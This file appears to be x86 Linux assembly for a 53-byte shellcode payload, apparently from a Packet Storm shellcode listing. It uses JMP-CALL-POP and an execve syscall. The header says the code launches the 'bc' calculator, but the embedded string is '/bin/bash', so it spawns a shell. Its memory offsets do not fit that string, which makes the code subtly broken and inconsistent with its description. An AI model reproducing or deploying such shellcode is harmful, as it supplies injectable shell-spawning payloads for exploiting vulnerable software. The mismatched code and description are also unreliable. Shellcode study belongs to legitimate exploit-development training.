; Date: 27/01/2019
; Execve_Calc.asm
; Author: Daniele Votta
; Description: This program invoke excve to run terminal calculator (bc).
; Tested on: i686 GNU/Linux
; Shellcode Length:53
; JMP | CALL | POP | Techniques
; See: https://packetstormsecurity.com/files/151376/Linux-x86-execve-bc-Shellcode.html
bits 32

global _start

section .text

_start:
    jmp    call_shellcode

shellcode:
    pop    esi
    xor    ebx,ebx
    mov    BYTE [esi+0xb],bl
    mov    DWORD [esi+0xc],esi
    mov    DWORD [esi+0x10],ebx
    lea    ebx,[esi]
    lea    ecx,[esi+0xc]
    lea    edx,[esi+0x10]
    xor    eax,eax
    mov    al,0xb
    int    0x80

call_shellcode:
    call   shellcode

message:
    db    "/bin/bash"